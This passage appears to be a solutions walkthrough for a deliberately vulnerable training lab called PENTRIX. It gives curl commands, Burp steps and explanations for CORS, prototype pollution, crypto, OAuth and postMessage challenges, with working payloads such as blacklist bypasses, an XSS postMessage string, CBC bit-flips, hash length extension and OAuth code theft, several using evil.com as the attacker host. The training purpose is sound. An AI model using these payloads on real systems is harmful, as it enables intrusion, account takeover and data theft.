Why it works: the post-login redirect is an absolute URL built from the `Host`
header, so a poisoned header sends the freshly authenticated victim to the
attacker's domain.

**Burp workflow:** Log in as alice on `/hostheader/login` (username=alice, password=alice123) and intercept the POST in Proxy. Send it to Repeater (Ctrl+R), change `Host` to `evil.com`, and send: the response is a 302 whose `Location` header is the absolute URL `http://evil.com/hostheader/dashboard`. That Location value is the whole proof, because the victim's browser follows it after a successful login, landing authenticated on the attacker's domain.

---


## cors - CORS Misconfiguration

**1. Reflected Origin with Credentials** - `PENTRIX{...}`

```bash
curl -s "http://<your-lab-address>/cors/prove?vuln=cors-reflect&origin=https%3A%2F%2Fevil.com" \
  | grep -o "PENTRIX{[^}]*}"
# raw check: curl -si -H "Origin: https://evil.com" .../cors/api/profile
#   -> Access-Control-Allow-Origin: https://evil.com
#   -> Access-Control-Allow-Credentials: true
```

Why it works: the endpoint reflects any `Origin` with credentials allowed and
no allowlist at all, so any website can read authenticated responses.

**Burp workflow:** Open /cors/api/profile in Burp's browser, then find the GET in the Proxy HTTP history and send it to Repeater (Ctrl+R). In Repeater add an Origin header with a domain you do not own, like https://evil.com, and send. If the response reflects your value in Access-Control-Allow-Origin and also returns Access-Control-Allow-Credentials: true, any site can read logged-in responses, so finish at /cors/prove?vuln=cors-reflect with that origin to take the flag.


**2. Null Origin Trusted** - `PENTRIX{...}`

```bash
curl -s "http://<your-lab-address>/cors/prove?vuln=cors-null&origin=null" \
  | grep -o "PENTRIX{[^}]*}"
# raw check: curl -si -H "Origin: null" .../cors/api/settings
#   -> Access-Control-Allow-Origin: null + Access-Control-Allow-Credentials: true
```

Why it works: `Origin: null` (sandboxed iframes, file:// pages) is trusted with
credentials, handing the data to attacker-controlled null-origin contexts.

**Burp workflow:** In Repeater, make a GET to /cors/api/settings and send it with no Origin header first to see the baseline response. Then add the header Origin: null and resend, and also try Origin: null with different casing or garbage values. If only the exact string null earns Access-Control-Allow-Origin: null plus Allow-Credentials: true, the server trusts null origins, so prove it in the Burp browser at /cors/prove?vuln=cors-null&origin=null.


**3. Regex Allowlist Bypass** - `PENTRIX{...}`

```bash
curl -s "http://<your-lab-address>/cors/prove?vuln=cors-regex&origin=https%3A%2F%2Fpentrix.lab.evil.com" \
  | grep -o "PENTRIX{[^}]*}"
```

Why it works: the naive regex `^https://.*pentrix\.lab` has no subdomain
boundary and no end anchor, so `https://pentrix.lab.evil.com` matches while not
being under pentrix.lab. (Note: the commonly written anchored form
`^https://.*\.pentrix\.lab$` would NOT match this payload - the missing dot
before `pentrix` and the missing `$` are exactly the naive mistakes.)

**Burp workflow:** Send a GET to /cors/api/data to Repeater (Ctrl+R) and look for the trusted domain hint in the challenge page, which is pentrix.lab. In Repeater, edit the Origin header to invent variants that keep that string somewhere inside, like placing an extra subdomain after it, and resend each try. When a variant comes back reflected with Allow-Credentials: true, the regex has no real boundary, so prove it with /cors/prove?vuln=cors-regex using the winning origin.


**4. Wildcard on Sensitive Data** - `PENTRIX{...}`

```bash
curl -s "http://<your-lab-address>/cors/prove?vuln=cors-wildcard-data&origin=https%3A%2F%2Fevil.com" \
  | grep -o "PENTRIX{[^}]*}"
# raw check: curl -si .../cors/api/users
#   -> Access-Control-Allow-Origin: *  + every user's email in the body
```

Why it works: a wildcard origin on an endpoint returning sensitive user data
means literally any website can read it.

**Burp workflow:** In the Proxy browser, visit /cors/api/users and then open the request in the Proxy HTTP history and send it to Repeater (Ctrl+R). Add an Origin header with any attacker domain and resend, then check whether Access-Control-Allow-Origin is a wildcard while the body contains user emails. A wildcard on sensitive data means every site can read it, so prove it at /cors/prove?vuln=cors-wildcard-data with your origin.


**5. Subdomain Suffix Check** - `PENTRIX{...}`

```bash
curl -s "http://<your-lab-address>/cors/prove?vuln=cors-subdomain&origin=https%3A%2F%2Fevil.trusted.pentrix.lab" \
  | grep -o "PENTRIX{[^}]*}"
```

Why it works: the check is only `hostname.endsWith('.trusted.pentrix.lab')`
with no allowlist of real subdomains, so an attacker-controlled subdomain
passes.

**Burp workflow:** Send a GET to /cors/api/partner to Repeater (Ctrl+R) and first try a random Origin to see the baseline. The challenge checks that the hostname ends with .trusted.pentrix.lab, so in Repeater invent your own subdomain under that suffix, like evil.trusted.pentrix.lab, and resend. If your invented host is reflected with credentials, the suffix check is the whole trust model, so prove it with /cors/prove?vuln=cors-subdomain using that origin.


**6. Exposed Admin Token Header** - `PENTRIX{...}`

```bash
curl -s "http://<your-lab-address>/cors/prove?vuln=cors-expose-headers&origin=https%3A%2F%2Fevil.com" \
  | grep -o "PENTRIX{[^}]*}"
# raw check: curl -si .../cors/api/token
#   -> X-Admin-Token: <secret>  +  Access-Control-Expose-Headers: X-Admin-Token
```

Why it works: the sensitive `X-Admin-Token` response header is listed in
`Access-Control-Expose-Headers`, so any website the victim visits can read it
with JavaScript.

**Burp workflow:** Visit /cors/api/token in Burp's browser with an attacker Origin and send the request to Repeater (Ctrl+R), then resend with Origin: https://evil.com. Read the response headers: first confirm Access-Control-Allow-Origin is wide open, then look for Access-Control-Expose-Headers and check whether X-Admin-Token is named in it. If the sensitive header is exposed, a page on another origin can read it with JavaScript, so prove it at /cors/prove?vuln=cors-expose-headers&origin=https://evil.com.

---


## proto – Prototype Pollution

**1. Query-String Pollution** – `PENTRIX{...}`
1. Merge the payload (brackets URL-encoded for curl):
   `curl -c jar -b jar "http://<your-lab-address>/proto/query?__proto__%5Brole%5D=admin"`
2. Open the admin check in the same session:
   `curl -c jar -b jar "http://<your-lab-address>/proto/query/admin"`
   The page prints `PENTRIX{...}`.
Why it works: the nested query parser keeps `__proto__` as a real key and the naive `merge()` walks it straight onto `Object.prototype`, so a brand-new `{}` inherits `role = 'admin'`.

**Burp workflow:** Open `http://<your-lab-address>/proto/query` in the browser with Proxy on so Burp records the request in HTTP history. Send the `/proto/query` request to Repeater (Ctrl+R) and add a nested query parameter whose key path reaches `Object.prototype` with the `role` key set to `admin` (URL-encoded brackets work). Forward that request in Repeater, then visit `/proto/query/admin` in the same Burp browser session and read the flag in the response. Check Proxy history if anything looks off, it should show both requests going out cleanly.


**2. JSON Body Pollution** – `PENTRIX{...}`
1. POST a JSON body with a literal `__proto__` key:
   `curl -c jar -b jar -X POST http://<your-lab-address>/proto/json/merge -H 'Content-Type: application/json' -d '{"__proto__": {"role": "admin"}}'`
2. `curl -c jar -b jar http://<your-lab-address>/proto/json/admin` prints `PENTRIX{...}`.
Why it works: `JSON.parse` creates an own property literally named `__proto__`, and the merge copies it onto `Object.prototype` with no key filtering.

**Burp workflow:** On the merge console page (`/proto/json`), click Merge with Burp Proxy intercepting, then send the intercepted `POST /proto/json/merge` request to Repeater (Ctrl+R). In Repeater, rewrite the JSON body so its top-level key targets the prototype with a nested object that sets the `role` key the admin check reads; keep `Content-Type: application/json` intact. Fire the merge in Repeater until it succeeds, then open `/proto/json/admin` in the browser to claim the flag.


**3. Blacklist Bypass via constructor** – `PENTRIX{...}`
1. The merge drops any key containing the literal string `__proto__`. Take the other entrance to the prototype chain:
   `curl -c jar -b jar "http://<your-lab-address>/proto/constructor?constructor%5Bprototype%5D%5Brole%5D=admin"`
2. `curl -c jar -b jar http://<your-lab-address>/proto/constructor/admin` prints `PENTRIX{...}`.
Why it works: `constructor.prototype` reaches the very same `Object.prototype`, and the blacklist only blocks the literal `__proto__` spelling, so the merge pollutes through the back door.

**Burp workflow:** This merge endpoint drops any key containing the literal string `__proto__`, so plain pollution gets filtered. In the Proxy history for `/proto/constructor`, send the request to Repeater (Ctrl+R) and instead craft a nested query parameter that walks `constructor[prototype][role]` to `admin`, which reaches the same `Object.prototype` through the back door. Forward it, then hit `/proto/constructor/admin` in the Burp browser to read the flag. If it fails, double check your brackets are encoded and that no literal `__proto__` string snuck in.


**4. Polluting toString** – `PENTRIX{...}`
1. `curl "http://<your-lab-address>/proto/dos?__proto__%5BtoString%5D=boom"`
2. The response is the crash page ("The widget broke") containing `PENTRIX{...}`.
Why it works: `__proto__[toString]=boom` merges the string `"boom"` into the widget's per-request prototype scope, so the page's `` `${widget}` `` coercion calls a non-function `toString` and throws; the crash handler awards the flag.

**Burp workflow:** Browse to `http://<your-lab-address>/proto/dos` with Proxy on and send the GET request to Repeater (Ctrl+R). Add a nested query parameter that lands the `toString` key on the prototype with a non-function value like `boom`. Send it in Repeater and the response will be the crash page ("The widget broke") carrying the flag. No second request needed, one polluted request plus one render equals the flag.


**5. Client-Side Pollution** – `PENTRIX{...}`
1. Open `http://<your-lab-address>/proto/client?__proto__[theme]=dark` in a real browser.
2. The page's in-browser parser + naive merge pollutes `Object.prototype` in that page, the theme box renders `dark` (read from a fresh `{}`), and the page auto-reports to `/proto/client/claim?theme=dark`, which prints `PENTRIX{...}`.
Why it works: the vulnerable merge runs in the victim's browser, so a `__proto__[theme]` query parameter changes what every fresh object in the page reads; the page itself reports the demonstrated value to the claim endpoint.
(Verified by executing the page's exact script with a simulated DOM: a fresh `{}` read `theme = 'dark'` and the script built the claim redirect.)

**Burp workflow:** This one needs Burp's built-in browser (Proxy tab, Open browser), because the vulnerable merge runs in the page's JavaScript, not on the server. Browse to `http://<your-lab-address>/proto/client` and confirm the request shows in Proxy history. Send that request to Repeater (Ctrl+R), add a nested query parameter that sets the theme key on the shared prototype to a non-default value like `dark`, and load the crafted URL in Burp's browser. Watch the theme box render the polluted value from a fresh `{}`, then find the flag in the auto-request to `/proto/client/claim?theme=...` in Proxy history. Remember the server never sees the pollution itself, so Repeater alone cannot claim this one.


**6. Unicode Escape Bypass** – `PENTRIX{...}`
1. The merge endpoint rejects raw bodies containing the literal string `__proto__` (400). Smuggle it as JSON escapes, sent as `text/plain` so the server sees your exact bytes:
   `curl -c jar -b jar -X POST http://<your-lab-address>/proto/unicode/merge -H 'Content-Type: text/plain' --data-binary '{"\u005f\u005fproto\u005f\u005f": {"role": "admin"}}'`
   The response says "Blacklist passed".
2. `curl -c jar -b jar http://<your-lab-address>/proto/unicode/admin` prints `PENTRIX{...}`.
Why it works: the blacklist scans the raw text, but `JSON.parse` decodes `\u005f` escapes after the scan, so the forbidden `__proto__` key materializes inside the merge.

**Burp workflow:** The `/proto/unicode/merge` endpoint rejects any raw body containing the literal string `__proto__` (400). On the merge page, intercept the `POST /proto/unicode/merge` request in Proxy and send it to Repeater (Ctrl+R). In Repeater, change `Content-Type` to `text/plain` and send the JSON with the forbidden key smuggled as `\u` escapes (each underscore as `\u005f`), so the blacklist scan passes but `JSON.parse` decodes the escapes after the scan. When Repeater shows "Blacklist passed", open `/proto/unicode/admin` in the Burp browser to claim the flag.

---


## crypto – Cryptographic Failures

**1. Predictable Reset PIN** – `PENTRIX{...}`
1. `curl -c jar -b jar -X POST http://<your-lab-address>/crypto/pin/generate`
2. Brute-force `0000`-`9999` against `POST /crypto/pin/verify` with `pin=<guess>` as a form field. There is no rate limiting. The real math: the space is 10,000 guesses. Measured on the lab host, a plain script with parallel keep-alive connections runs at about 130 to 150 requests per second, so a script needs about 70 to 80 seconds for the worst case. Burp Community Intruder is throttled, so the same 10,000-payload attack takes longer there: expect tens of minutes, and time a 100-payload test run first, then multiply by 100, to estimate your machine. The winning response contains `PENTRIX{...}`.
Why it works: the PIN comes from `Math.random`, which is not a CSPRNG, and a 4-digit space with no lockout is enumerable. (An earlier version of this lab used a 6-digit PIN; at Community Intruder speeds a million payloads is hours to days, which is why the space is 10,000 now.)

**Burp workflow:** Browse to /crypto/pin with Proxy on and click Generate reset PIN. In Proxy history find the POST /crypto/pin/verify request, send it to Intruder (Ctrl+I), mark the pin field as the payload position, and run a null payload generating 0000-9999. Read the results with a Grep-Match rule for the success page, or watch for the one response that comes back longer than the rest: that is your winning guess.


**2. ECB Decryption Oracle** – `PENTRIX{...}`
1. Find the block size: `POST /crypto/ecb/encrypt` with `inhex=` set to `41` repeated N times. The hex ciphertext (in `<code id="ct">`) grows from 32 to 48 bytes at a 4-byte prefix, so the block size is 16. (Careful: when prefix + secret exactly fills a block, PKCS#7 appends a full pad block, which also grows the ciphertext.)
2. Confirm ECB: encrypt 48 identical bytes (`41` x 48 as hex); the ciphertext shows three identical 16-byte blocks.
3. Find the secret length: first growth at prefix 4, and a disambiguation probe at prefix 19 still returns 48 bytes (not 64), so the length is 28, not 29.
4. Decrypt byte-at-a-time: for byte `i`, send a prefix of `15 - (i mod 16)` bytes so the unknown byte lands at the end of block `floor(i/16)`. Build a dictionary of that block's ciphertext for all 256 possible last-byte values (`prefix || known || guess`), then look up the block from the prefix-only query. Repeat for all 28 bytes.
5. `POST /crypto/ecb/solve` with `plaintext=<recovered secret>`. The attack recovered `O0R6LQSmrFzKTjqy996nBOUrCxQ=` (28 bytes; the secret is random per boot) and the response contained `PENTRIX{...}`.
Why it works: ECB encrypts identical plaintext blocks to identical ciphertext blocks, so attacker-controlled prefix bytes can align each unknown secret byte to a block boundary and identify it by dictionary comparison.

**Burp workflow:** Browse to the vault page with Proxy on, submit the form once, and send the POST /crypto/ecb/encrypt request to Repeater (Ctrl+R). Use Repeater to probe the oracle: send longer inhex prefixes to find the 16-byte block size and identical blocks to confirm ECB. For the byte-at-a-time loop, send the base query to Intruder (Ctrl+I) so it can hammer the 256-guess dictionary, then POST the recovered secret to /crypto/ecb/solve through Repeater.


**3. CBC Bit-Flipping** – `PENTRIX{...}`
1. `curl -c jar -b jar -X POST http://<your-lab-address>/crypto/cbc/login` and copy the base64 cookie from `<code id="ck">`.
2. Decode it: the first 16 bytes are the IV, the rest is `AES-128-CBC(iv, '{"role":"guest","user":"guest"}')`. The string `"guest"` (the role value) sits at plaintext bytes 9-13, directly under the IV.
3. Flip the IV bytes over it: `iv[9+i] ^= 'guest'[i] ^ 'admin'[i]` for `i` in 0..4. Reassemble `base64(new_iv || ciphertext)`.
4. `curl -c jar -b jar -X POST http://<your-lab-address>/crypto/cbc/check --data-urlencode "cookie=<forged>"`. The server decrypts it, sees `role = 'admin'`, and prints `PENTRIX{...}`.
Why it works: CBC decryption XORs each block with the previous ciphertext block (or IV), so IV bit flips cause predictable plaintext bit flips, and the cookie has no integrity check (no MAC) to reject the tampering.

**Burp workflow:** In Burp Proxy, open /crypto/cbc and click login, then copy the base64 cookie from the page. Paste it into Burp Decoder to base64-decode it and see the IV bytes and the JSON with the role. XOR the IV bytes sitting over "guest" with the bytes of "admin" (do this in a quick script or by hand), re-encode the result in Decoder, and POST the forged cookie to /crypto/cbc/check through Repeater (Ctrl+R).


**4. Hash Length Extension** – `PENTRIX{...}`
1. `GET /crypto/mac/sign?msg=role%3Duser` returns `{"msg": "role=user", "mac": "<sha256 hex>"}`. The page states the secret is 16 bytes, and the signer refuses any message containing `admin`.
2. In pure code (a from-scratch SHA-256 with injectable initial state; no new dependencies), take the returned MAC as the compression state. Build the glue padding for a 25-byte prefix (16 secret + 9 message bytes): `0x80`, zeros, then the 64-bit big-endian bit length.
3. Forged message = `role=user || glue || ;admin=1` (hex-encode it as `msghex`). Forged MAC = continue SHA-256 from the leaked state over `;admin=1 || padding-for-72-bytes`.
4. `POST /crypto/mac/verify` with `msghex=<hex>` and `mac=<forged hex>`. The response contains `PENTRIX{...}`.
Why it works: SHA-256 is Merkle-Damgard, so its digest is the entire internal state; anyone holding one valid MAC can append data and compute a valid MAC for the longer message without ever learning the secret.

**Burp workflow:** In Burp Proxy, browse to /crypto/mac and submit the signing form with msg=role=user, then send the GET /crypto/mac/sign response to Repeater (Ctrl+R) so you have the MAC. Build the forged message and forged MAC offline (glue padding plus ";admin=1"), hex-encode the forged message as msghex, and POST both to /crypto/mac/verify through Repeater. The server accepts the extended message it never signed.


**5. Crack the MD5** – `PENTRIX{...}`
1. Read the leaked hash from `/crypto/md5` (it is `0571749e2ac330a7455809c6b0e7af90`, fixed per lab design).
2. Fetch `/crypto/md5/wordlist.txt` and MD5 each of the 48 candidates until one matches: the password is `sunshine`.
3. `curl -c jar -b jar -X POST http://<your-lab-address>/crypto/md5/login --data-urlencode "username=demo" --data-urlencode "password=sunshine"`. The login succeeds and prints `PENTRIX{...}`.
Why it works: an unsalted, fast MD5 of a dictionary word falls to an offline dictionary attack in milliseconds.

**Burp workflow:** Browse to the LegacyBox login page through Burp Proxy, then fetch the leaked hash and the wordlist in Repeater (Ctrl+R). Crack the unsalted MD5 offline by hashing each wordlist candidate (or use Burp Decoder's hash function one at a time). Send the POST /crypto/md5/login to Repeater, fill in the username and the recovered password, and resend: the login succeeds.


**6. Base64 "Encryption"** – `PENTRIX{...}`
1. `curl -c jar -b jar -X POST http://<your-lab-address>/crypto/b64/login` and copy the cookie from `<code id="ck">`.
2. Decode it: `echo '<cookie>' | base64 -d` gives `{"user":"guest","role":"user"}`. Change `"role":"user"` to `"role":"admin"` and re-encode with base64.
3. `curl -c jar -b jar -X POST http://<your-lab-address>/crypto/b64/check --data-urlencode "cookie=<re-encoded>"`. The response prints `PENTRIX{...}`.
Why it works: the "encryption" was only base64 encoding, which is trivially reversible, and the server trusts whatever decodes to valid JSON.

**Burp workflow:** With Proxy on, click login on /crypto/b64 and copy the cookie from the page. Paste it into Burp Decoder and base64-decode it to see the plain JSON with "role":"user". Edit the JSON to "role":"admin", re-encode it in Decoder, and send the POST /crypto/b64/check request to Repeater (Ctrl+R) with the forged cookie in the body. The server decodes and trusts it.


**7. XOR Crib Dragging** – `PENTRIX{...}`
1. Copy the ciphertext hex from `<code id="ct">` on `/crypto/xor`.
2. The page tells you every document starts with the 9-byte header `{"user":"`. For each candidate key length 1-12: derive `key[i mod L] = ct[i] XOR crib[i]` over the crib, decrypt the full ciphertext, and keep the length that yields valid JSON. (Length 8 wins; the key and token are random per boot. One run recovered key `aa9bf2fdf48bd86d` and plaintext `{"user":"guest","token":"6a6a86ab2543cd2d"}`.)
3. `POST /crypto/xor/solve` with `plaintext=<recovered JSON>`. The response contains `PENTRIX{...}`.
Why it works: a short repeating XOR key turns known plaintext into known keystream, so the crib exposes the key bytes and the rest of the message decrypts.

**Burp workflow:** Open Burp, proxy your browser, and browse to /crypto/xor; copy the ciphertext hex from the payload block on the page. Run the crib-drag offline in Python using the known 9-byte header {"user":", trying key lengths 1-12 and keeping the length that yields valid JSON. Then send POST /crypto/xor/solve through Repeater (Ctrl+R) with the recovered plaintext in the body.


**8. Key in JavaScript** – `PENTRIX{...}`
1. `curl http://<your-lab-address>/crypto/keyjs/app.js` and read the key: `const ENCRYPTION_KEY = 'PenTrixKey2026!!';` (16 bytes, hardcoded in the served bundle).
2. Copy the ciphertext hex from `<code id="ct">` on `/crypto/keyjs`. The first 16 bytes are the IV. Decrypt AES-128-CBC with the stolen key, e.g. in Node:
   `crypto.createDecipheriv('aes-128-cbc', Buffer.from('PenTrixKey2026!!'), iv)`.
   The note decrypts to `Vault combination: 04-17-2026. Do not share.`
3. `POST /crypto/keyjs/solve` with `plaintext=<decrypted note>`. The response contains `PENTRIX{...}`.
Why it works: a key shipped to the browser is public to every visitor, and with the IV prepended to the ciphertext anyone can decrypt the "client-side encrypted" note offline.

**Burp workflow:** Browse to the Secure Notes vault note page through Burp Proxy, then send the GET /crypto/keyjs/app.js request to Repeater (Ctrl+R) and read the served JavaScript to find the hardcoded AES key. Copy the ciphertext hex from the page, decrypt it offline with the stolen key and the prepended IV, and POST the decrypted note to /crypto/keyjs/solve through Repeater.

---


## oauth – OAuth Flaws

**1. Redirect URI Prefix Bypass** – `PENTRIX{...}`

1. Log in to the IdP as alice: `GET /oauth/login/alice`.
2. Open the authorization URL with an attacker-controlled redirect URI that still
   starts with the trusted prefix:
   ```
   /oauth/idp/authorize?client_id=pentrix-spa&redirect_uri=http%3A%2F%2Fapp.pentrix.lab.evil.com%2Fcb&response_type=code&scope=read
   ```
   The prefix check `redirect_uri.startsWith("http://app.pentrix.lab")` passes
   because the string starts with the prefix even though the host is
   `app.pentrix.lab.evil.com`.
3. Approve the request. The approval page shows the flag: the IdP issued a code
   and redirected it to a foreign host.
   Equivalent curl (with the cookie jar from step 1):
   ```
   curl -b jar -c jar -X POST --data "client_id=pentrix-spa&redirect_uri=<enc>&response_type=code&scope=read" http://<your-lab-address>/oauth/idp/approve
   ```
   (fields copied from the hidden inputs on the authorize page)
Why it works: redirect validation uses a naive string-prefix check instead of an
exact match against the registered URI, so `http://app.pentrix.lab.evil.com/cb`
passes and the code leaves for the attacker host.

**Burp workflow:** Proxy the browser and log in to the IdP as alice through /oauth/login/alice. Open the authorize URL on /oauth/idp/authorize with response_type=code, and in Proxy history find the GET where you control the redirect_uri query value. Send it to Repeater (Ctrl+R) and change redirect_uri to a URL that still starts with the trusted prefix but points elsewhere (a different host like a subdomain of it works), then fire the request and approve on the page. Watch the 302 Location: the code goes to the foreign host, which is the bug.


**2. Authorization Code Leaked in Server Log** – `PENTRIX{...}`

1. Open `GET /oauth/idp/log`. Every issued code is written there in clear, and a
   recent login by alice is pre-seeded. Copy her code, e.g.
   `code=de0b4b47e4dba33240d038d55ef17d9b`.
2. Log in to the IdP as bob (a different user) and exchange her code directly:
   ```
   curl -b jar-bob -X POST --data "client_id=pentrix-spa&code=<alice-code>" http://<your-lab-address>/oauth/idp/token
   ```
   Response contains `access_token` and `flag: PENTRIX{...}`.
   (`pentrix-spa` is a public client, so no secret is needed.)
Why it works: codes are secrets, but the IdP logs them to a world-readable log,
and the token endpoint accepts a code whose owner differs from the requester.

**Burp workflow:** Open /oauth/idp/log in the browser with Proxy on and find alice's issued code in the log lines. Log in as a different user (bob) in another browser profile or a private window, then in Repeater build a POST to /oauth/idp/token with client_id=pentrix-spa and code set to alice's stolen code. Fire it with no IdP session or bob's session: the token endpoint hands you a token for alice's code, and the flag rides along in the response.


**3. Login CSRF (Missing state Parameter)** – `PENTRIX{...}`

1. As the attacker, log in to the IdP as bob and open
   `GET /oauth/no-state/attacker`. It mints a code for bob's account and prints
   a malicious link like `/oauth/client/callback?code=<bob-code>`.
2. As the victim (a session logged in to the IdP as alice), visit that link:
   ```
   curl -b jar-alice -c jar-alice "http://<your-lab-address>/oauth/client/callback?code=<bob-code>"
   ```
   The response shows `PENTRIX{...}` and explains that the client
   session is now bob while the IdP session is alice: alice is logged in to the
   client **as the attacker**.
Why it works: the client callback exchanges any `code` it is given and never
validates a `state` parameter, so an attacker-minted code silently logs the
victim in under the attacker's account.

**Burp workflow:** With Proxy on, log in to the IdP as bob and open /oauth/no-state/attacker, which mints a code tied to bob and prints a malicious /oauth/client/callback?code=... link. Now switch to a browser session logged in to the IdP as alice (another profile), paste that callback link in the address bar, and load it. The client exchanges the code with no state check, so alice's client session becomes bob; the response tells you the login-CSRF landed.


**4. Implicit Flow Token in URL Fragment** – `PENTRIX{...}`

1. As the victim (alice), run the implicit flow and approve it:
   ```
   /oauth/idp/authorize?client_id=pentrix-spa&redirect_uri=<enc client host>&response_type=token&scope=read
   ```
   Copy the resulting fragment, e.g. `#access_token=b096f586dc18...&token_type=Bearer`.
2. Simulate the victim browser landing on the callback URL with that fragment.
   The in-lab page records the full URL in browser history; equivalent curl:
   ```
   curl -X POST -H 'Content-Type: application/json' \
     --data '{"url":"http://app.pentrix.lab/callback#access_token=<tok>&token_type=Bearer"}' \
     http://<your-lab-address>/oauth/client/history-log
   ```
3. As the attacker, read `GET /oauth/client/history`, steal the token, and call
   userinfo with it:
   ```
   curl "http://<your-lab-address>/oauth/idp/userinfo?access_token=<tok>"
   ```
   Response contains `flag: PENTRIX{...}`.
Why it works: the implicit flow puts the access token in the URL fragment, and
fragments are kept in browser history, so anyone who can read the history owns
the token and the IdP accepts it regardless of who presents it.

**Burp workflow:** Proxy the browser, log in to the IdP as alice, and run the implicit flow: open /oauth/idp/authorize with response_type=token and approve it. The browser lands on the callback URL with #access_token=... in the fragment; the lab page posts that full URL to /oauth/client/history-log, which you can confirm in Proxy history. Then open /oauth/client/history, copy the fragment token out of the stored URL, and send a GET to /oauth/idp/userinfo?access_token=<token> in Repeater: the token leaks from history and userinfo trusts whoever presents it, so the flag comes back.


**5. Scope Tampering** – `PENTRIX{...}`

1. As bob (a plain user), authorize with a scope you were never granted:
   ```
   /oauth/idp/authorize?client_id=pentrix-spa&redirect_uri=<enc>&response_type=code&scope=admin
   ```
   Approve and copy the code.
2. Exchange the code and use the token on the admin-only endpoint:
   ```
   curl -X POST --data "client_id=pentrix-spa&code=<code>" http://<your-lab-address>/oauth/idp/token
   curl "http://<your-lab-address>/oauth/idp/admin-data?access_token=<tok>"
   ```
   Response contains the admin secret and `flag: PENTRIX{...}`.
Why it works: the authorize endpoint takes `scope` from the request and grants
whatever is asked for without checking the user's role.

**Burp workflow:** Log in to the IdP as bob with Proxy on and open the /oauth/idp/authorize request for pentrix-spa in Proxy history. Send it to Repeater (Ctrl+R) and change the scope query value from read to admin, then fire it and approve the consent page. Copy the issued code, exchange it at POST /oauth/idp/token in Repeater, and call /oauth/idp/admin-data?access_token=<token>: the authorize endpoint grants whatever scope you ask for, so an ordinary user walks in with admin scope and the flag.


**6. Client Secret in Public JavaScript** – `PENTRIX{...}`

1. Download the public bundle: `GET /oauth/client/app.js`. It contains the
   confidential client's secret in clear:
   ```
   var CLIENT_SECRET = 'sk_live_9f2c7b41d8e0a5c6';
   ```
2. As bob, authorize the confidential client (`client_id=pentrix-client`,
   `response_type=code`) and approve; copy the issued code.
3. Exchange the code directly at the token endpoint with the stolen secret:
   ```
   curl -b jar-bob -X POST --data "client_id=pentrix-client&client_secret=sk_live_9f2c7b41d8e0a5c6&code=<code>" http://<your-lab-address>/oauth/idp/token
   ```
   Response contains `flag: PENTRIX{...}`.
Why it works: a "confidential" client's secret is shipped to every browser in
the public JavaScript bundle, so it is not secret at all and anyone can
complete the confidential-client exchange.

**Burp workflow:** In Repeater, GET /oauth/client/app.js and read the CLIENT_SECRET variable sitting in clear in the public bundle. Log in to the IdP as bob in the browser and run the normal authorize flow for client_id=pentrix-client, approving it and copying the issued code. Then send the token exchange to Repeater (Ctrl+R) as a direct POST to /oauth/idp/token with client_id=pentrix-client, the stolen client_secret, and your code: presenting the leaked secret completes the confidential-client exchange and the flag is returned.


**7. Authorization Code Replay** – `PENTRIX{...}`

Work from the Lab 7 page (`/oauth/code-replay`) in the same browser session:
the replay flag is scoped to codes issued inside that lab's own flow, so
replaying a code minted during another lab (a PKCE-bound code, an
admin-scoped code) earns nothing here.

1. As bob, authorize `pentrix-spa` (`response_type=code`) and approve; copy the code.
2. Exchange the same code twice:
   ```
   curl -b jar-bob -X POST --data "client_id=pentrix-spa&code=<code>" http://<your-lab-address>/oauth/idp/token
   curl -b jar-bob -X POST --data "client_id=pentrix-spa&code=<code>" http://<your-lab-address>/oauth/idp/token
   ```
   Both responses return valid, different access tokens; the second response
   contains `flag: PENTRIX{...}`.
Why it works: the IdP counts code uses but never invalidates them, so a
single-use code stays valid forever.

**Burp workflow:** Log in to the IdP as bob with Proxy on, run the normal authorize flow for pentrix-spa with response_type=code, and approve it. Find the token exchange in Proxy history (POST /oauth/idp/token with client_id=pentrix-spa and your code) and send it to Repeater (Ctrl+R). Fire the identical exchange request a second time: the IdP never invalidates the code, so both exchanges return valid tokens, and the second response carries the flag.


**8. PKCE Downgrade** – `PENTRIX{...}`

1. As bob, authorize with a code challenge:
   ```
   /oauth/idp/authorize?client_id=pentrix-spa&redirect_uri=<enc>&response_type=code&scope=read&code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM&code_challenge_method=S256
   ```
   Approve and copy the code.
2. Exchange the code with **no** `code_verifier`:
   ```
   curl -b jar-bob -X POST --data "client_id=pentrix-spa&code=<code>" http://<your-lab-address>/oauth/idp/token
   ```
   Response contains a valid token and `flag: PENTRIX{...}`.
Why it works: the IdP records the challenge but the token endpoint never
requires the verifier, so PKCE provides no binding at all.

**Burp workflow:** Log in to the IdP as bob with Proxy on and start the authorize flow on /oauth/idp/authorize with code_challenge and code_challenge_method=S256 in the query string, then approve and copy the code. Send the token exchange to Repeater (Ctrl+R) and fire the POST to /oauth/idp/token with only client_id=pentrix-spa and the code, deleting the code_verifier parameter entirely. The token endpoint never checks the verifier, so the exchange succeeds without it and the flag comes back in the response.


---
---


## postmsg – postMessage Flaws

**1. No Origin Check on Message Handler** – `PENTRIX{...}`

1. Open `/postmsg/no-check/attacker` in the browser.
2. Click "Fire payload". The attacker page runs:
   ```
   document.getElementById('v').contentWindow.postMessage(
     '<img src=x onerror="document.getElementById(\'log\').textContent=\'XSS via postMessage\'">', '*');
   ```
3. The victim widget's handler writes `e.data` into `innerHTML` with no origin
   check, executes the markup, and beacons `v=no-check`.
Why it works: the `message` listener trusts any sender and renders the payload
as HTML, so any website can inject markup (and scripts) into the victim page.

**Burp workflow:** Open /postmsg/no-check/attacker with Intercept on and click "Fire payload". The victim's own handler beacons a GET to /postmsg/beacon?v=no-check when the payload lands, and that request in the Proxy is your proof the sink fired. Send the beacon to Repeater (Ctrl+R) and replay it: the page-bound token in the query string is what gets checked, so firing it cold without a real run gets rejected. Remember the postMessage itself never crosses the wire (it goes frame to frame in the browser), so Burp's job here is confirming the beacon, not injecting the message.


**2. Secret Leaked via Wildcard targetOrigin** – `PENTRIX{...}`

1. Open `/postmsg/wildcard/attacker` in the browser. It embeds the victim
   widget in an iframe.
2. On load, the victim widget runs
   `parent.postMessage({ token: SECRET_TOKEN, from: 'trusted-widget' }, '*')`.
   The attacker page listens, captures `e.data.token`, and beacons
   `v=wildcard&d=wildcard:<token>`. The beacon only awards when the payload
   contains the session's real secret (verified: a wrong token is rejected).
Why it works: `targetOrigin '*'` broadcasts the secret to every embedding page,
including a malicious one, which just listens and forwards it.

